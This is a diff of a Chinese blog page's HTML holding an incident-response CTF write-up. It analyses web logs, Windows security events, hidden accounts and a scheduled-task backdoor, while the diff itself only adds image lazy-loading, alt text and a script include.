 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> access.log | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c </span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_19.png" alt="在这里插入图片描述"><br>127.0.0.1是本机，先排除看一下, 并一个一个ip查看</p>
+<p><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_19.png" alt="应急响应基础·图19"><br>127.0.0.1是本机，先排除看一下, 并一个一个ip查看</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> access.log |  grep -v <span class="string">&quot;127.0.0.1&quot;</span> | grep -aP <span class="string">&quot;^192.168.150.1\b&quot;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_20.png" alt="在这里插入图片描述"><br>可以看到，这些都是正常的业务操作，所以排除这个ip</p>
+<p><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_20.png" alt="应急响应基础·图20"><br>可以看到，这些都是正常的业务操作，所以排除这个ip</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> access.log |  grep -v <span class="string">&quot;127.0.0.1&quot;</span> | grep -aP <span class="string">&quot;^192.168.150.33\b&quot;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_21.png" alt="在这里插入图片描述"><br>一堆与nmap相关的日志，不用像这肯定是恶意ip了</p>
+<p><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_21.png" alt="应急响应基础·图21"><br>一堆与nmap相关的日志，不用像这肯定是恶意ip了</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> access.log |  grep -v <span class="string">&quot;127.0.0.1&quot;</span> | grep -aP <span class="string">&quot;^192.168.150.60\b&quot;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_22.png" alt="在这里插入图片描述"><br>额、这不是恶意ip</p>
+<p><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_22.png" alt="应急响应基础·图22"><br>额、这不是恶意ip</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> access.log |  grep -v <span class="string">&quot;127.0.0.1&quot;</span> | grep -aP <span class="string">&quot;^192.168.150.67\b&quot;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_23.png" alt="在这里插入图片描述"></p>
+<p><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_23.png" alt="应急响应基础·图23"></p>
 <p>很明显的sql注入</p>
 <p>所以有6331+54&#x3D;6385，即 <code>flag{6385}</code></p>
 <p>对于rdp爆破，基础知识事件部分有汇总事件编号（事件ID”4625”）</p>
-<p><code>win + R -&gt; eventvwr.msc</code> 进入时间查看器，接着点击<code>windows 日志</code> -&gt; <code>安全</code>，再然后点击右边的<code>筛选当前日志</code><br> <img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_24.png" alt="在这里插入图片描述"><br>登录失败的结果<br><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_25.png" alt="在这里插入图片描述"></p>
+<p><code>win + R -&gt; eventvwr.msc</code> 进入时间查看器，接着点击<code>windows 日志</code> -&gt; <code>安全</code>，再然后点击右边的<code>筛选当前日志</code><br> <img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_24.png" alt="应急响应基础·图24"><br>登录失败的结果<br><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_25.png" alt="应急响应基础·图25"></p>
 <p>即： <code>flag{2594}</code></p>
-<p>继续在安全日志里面筛选 事件ID4624 将筛选出来的事件另存为桌面1.evtx<br><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_26.png" alt="在这里插入图片描述"></p>
-<p>选中刚刚导出来的事件文件<br><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_27.png" alt="在这里插入图片描述"></p>
+<p>继续在安全日志里面筛选 事件ID4624 将筛选出来的事件另存为桌面1.evtx<br><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_26.png" alt="应急响应基础·图26"></p>
+<p>选中刚刚导出来的事件文件<br><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_27.png" alt="应急响应基础·图27"></p>
 <p>在事件管理器搜索 4648</p>
-<p><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_28.png" alt="在这里插入图片描述"></p>
-<p>继续查看<br><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_29.png" alt="在这里插入图片描述"></p>
+<p><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_28.png" alt="应急响应基础·图28"></p>
+<p>继续查看<br><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_29.png" alt="应急响应基础·图29"></p>
 <p>等等，最后除去我们在玄机首页的外网ip和内网ip其他剩余的就是：<code>flag{192.168.150.1&amp;192.168.150.128&amp;192.168.150.178}</code></p>
-<p>搜索事件4720 这个是用户创建的事件ID,但是我在这里发现了两个hacke用户一个是 hacker$另外一个是 hackers$ 都拿去提交一下<br><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_30.png" alt="在这里插入图片描述"></p>
+<p>搜索事件4720 这个是用户创建的事件ID,但是我在这里发现了两个hacke用户一个是 hacker$另外一个是 hackers$ 都拿去提交一下<br><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_30.png" alt="应急响应基础·图30"></p>
 <p>即 <code>flag{hacker$}</code> ，实际上另一个是隐藏用户，所以 <code>flag{hackers$}</code></p>
 <p>提交远程shell程序的连接IP及端口，我们首先可以先看一下当前的端口连接状态 一般来说会出现可疑IP地址 在cmd里面 输入 netstat -ano</p>
-<p><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_31.png" alt="在这里插入图片描述"><br>重点查看正在监听的，但是没有任何发现</p>
-<p>打开计划任务：taskschd.msc，发现奇怪的时间执行奇怪的任务<br><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_32.png" alt="在这里插入图片描述"></p>
-<p>启动程序路径：C:\Windows\zh-CN<br><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_33.png" alt="在这里插入图片描述"></p>
-<p>找到后门<br><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_34.png" alt="在这里插入图片描述"><br><code>C:\Windows\system64\systemWo\xiaowei.exe</code></p>
-<p>然后丢沙箱<br><img src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_35.png" alt="在这里插入图片描述"></p>
+<p><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_31.png" alt="应急响应基础·图31"><br>重点查看正在监听的，但是没有任何发现</p>
+<p>打开计划任务：taskschd.msc，发现奇怪的时间执行奇怪的任务<br><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_32.png" alt="应急响应基础·图32"></p>
+<p>启动程序路径：C:\Windows\zh-CN<br><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_33.png" alt="应急响应基础·图33"></p>
+<p>找到后门<br><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_34.png" alt="应急响应基础·图34"><br><code>C:\Windows\system64\systemWo\xiaowei.exe</code></p>
+<p>然后丢沙箱<br><img loading="lazy" decoding="async" src="/images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80/image_35.png" alt="应急响应基础·图35"></p>
 <p>结束</p>
 
 		  <div class="article-footer-copyright">
@@ -1090,6 +1080,7 @@ MathJax = {
 <script src="/js/bootstrap.min.js"></script>
 <script src="/js/main.js"></script>
 <script src="/js/toc.js"></script>
+<script src="/js/reading.js"></script>
 <script src="/js/copy-code.js"></script>
 
    <script type="text/javascript">
